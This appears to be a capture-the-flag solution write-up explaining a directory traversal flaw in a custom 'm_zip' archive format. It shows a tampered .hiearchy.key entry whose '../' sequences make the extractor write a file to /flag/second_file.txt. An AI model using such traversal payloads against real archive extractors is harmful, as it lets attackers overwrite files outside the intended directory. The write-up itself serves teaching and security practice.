## Solution 
- m_zip files are created with the following directory structure: 
	- zip_file_name: 
		- .content: Holds all of the content for each file and name for all of the directories 
		- .hiearchy.key: Holds the hiearchy data for the location of each file 
		- .huffman.key: Holds the huffman table used for compression 
- When a zip file is recreating all of the files (from the content in the .content file that is huffman encoded), it trusts the `.hiearchy.key` file too much. 
- A `.hiearchy.key` encoded file may look like this: 
``
0 zipped/test_folder/second_folder/second_file.txt
1 zipped/test_folder/second_folder/second_file.txt
2 zipped/test_folder/a.out
3 zipped/test_folder/file.md
4 zipped/test_folder/flag.txt
5 zipped/test_folder/third_folder
6 zipped/test_folder/second_folder
7 zipped/test_folder/second_folder/nested_folder
8 zipped/test_folder
``
	- The numbers correspond to the compressed data within the .content file. 
	- The directory represents where the data should be written to. At decode time, the first directory (in this case zipped/) is removed. These are the locations where each file will be written to. 
- Because of the trust in the file names, it is possible to perform an directory traversal on the unzipping server. 
- This can be done by changing the `.hiearchy.key` file to have ``../``'s in the name. For example, we will write a file to /flag/second_file.txt
``
0 zipped/test_folder/second_folder/../../../../../../../../../flag/second_file.txt
1 zipped/test_folder/second_folder/second_file.txt
2 zipped/test_folder/a.out
3 zipped/test_folder/file.md
4 zipped/test_folder/flag.txt
5 zipped/test_folder/third_folder
6 zipped/test_folder/second_folder
7 zipped/test_folder/second_folder/nested_folder
8 zipped/test_folder
``
-
A seen above, the payload is ``zipped/test_folder/second_folder/../../../../../../../flag/second_file.txt``. 
	- This will traverse all the way to the root directory (/).
	- Then, end up being /flag/second_file.txt
- Note: 
	- There is no limit on the amount of ../'s being used. Eventually, this will hit the root directory and stop going up. 

